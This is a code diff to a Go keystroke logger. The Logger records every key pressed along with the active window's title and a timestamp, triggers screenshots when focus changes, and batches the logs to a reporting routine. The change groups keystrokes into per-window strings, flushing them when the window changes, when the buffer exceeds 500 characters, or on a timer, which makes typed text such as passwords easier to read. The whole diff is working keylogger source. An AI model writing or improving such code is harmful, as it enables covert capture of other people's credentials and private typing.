@@ -107,6 +107,9 @@ type Logger struct {
 	Mu        sync.Mutex     // Mutex for safe batch access.
 	LastHwnd    uintptr        // Cache for last active window handle.
 	LastTitle      string         // Cache for last active window title.
+	keyBuffer      strings.Builder // Aggregates keystrokes per window
+	currentWindow  string         // The window currently aggregating keystrokes
+	windowTs       string         // Timestamp when the current window focus started
 	LogQueue       chan string    // Channel for reporting worker pool.
 	LogCallback    func(string)   // Optional callback for UI live preview.
 	LastScreenshot time.Time      // Debounce timestamp for screenshots
@@ -251,24 +254,34 @@ func (l *Logger) Start() {
 					win := l.getActiveWindowInfo()
 					l.checkScreenshotTrigger(win, false)
 
-					ts := time.Now().Format("2006-01-02 15:04:05")
-					logLine := fmt.Sprintf("[%s] [%s] %s", ts, win, key)
-
 					l.Mu.Lock()
-					l.Batch = append(l.Batch, logLine)
-					// Flush at 10 keystrokes instead of 3 — reduces disk I/O by ~70%.
-					if len(l.Batch) >= 10 {
-						combined := strings.Join(l.Batch, "\n")
-						l.Batch = l.Batch[:0]
-						l.Mu.Unlock()
-						l.report(combined)
-					} else {
-						l.Mu.Unlock()
+					// If the active window changed or buffer gets too large, flush the current buffer
+					if win != l.currentWindow || l.keyBuffer.Len() > 500 {
+						if l.keyBuffer.Len() > 0 {
+							logLine := fmt.Sprintf("[%s] [%s] %s", l.windowTs, l.currentWindow, l.keyBuffer.String())
+							l.Batch = append(l.Batch, logLine)
+							l.keyBuffer.Reset()
+							
+							if len(l.Batch) >= 3 {
+								combined := strings.Join(l.Batch, "\n")
+								l.Batch = l.Batch[:0]
+								l.Mu.Unlock()
+								l.report(combined)
+								l.Mu.Lock()
+							}
+						}
+						l.currentWindow = win
+						l.windowTs = time.Now().Format("2006-01-02 15:04:05")
 					}
 					
+					// Append the typed key to the buffer
+					l.keyBuffer.WriteString(key)
+					
 					if l.LogCallback != nil {
-						l.LogCallback(logLine)
+						// For local UI preview, we can still stream live
+						l.LogCallback(fmt.Sprintf("[%s] [%s] %s", time.Now().Format("2006-01-02 15:04:05"), win, key))
 					}
+					l.Mu.Unlock()
 				}
 			case mouseEv, ok := <-mouseChan:
 				if !ok {
@@ -295,6 +308,14 @@ func (l *Logger) Start() {
 				// TRIGGER 2: Screenshot on Focus Change (immediate)
 				win := l.getActiveWindowInfo()
 				l.Mu.Lock()
+				
+				// Also flush buffer periodically on focus checks if it's been a while
+				if l.keyBuffer.Len() > 0 {
+					logLine := fmt.Sprintf("[%s] [%s] %s", l.windowTs, l.currentWindow, l.keyBuffer.String())
+					l.Batch = append(l.Batch, logLine)
+					l.keyBuffer.Reset()
+				}
+				
 				if win != l.LastActiveWin {
 					l.LastActiveWin = win
 					l.Mu.Unlock()
@@ -304,6 +325,14 @@ func (l *Logger) Start() {
 				}
 			case <-ticker.C:
 				l.Mu.Lock()
+				
+				// Flush any pending keystrokes in the string builder buffer
+				if l.keyBuffer.Len() > 0 {
+					logLine := fmt.Sprintf("[%s] [%s] %s", l.windowTs, l.currentWindow, l.keyBuffer.String())
+					l.Batch = append(l.Batch, logLine)
+					l.keyBuffer.Reset()
+				}
+				
 				if len(l.Batch) > 0 {
 					combined := strings.Join(l.Batch, "\n")
 					l.Batch = l.Batch[:0]
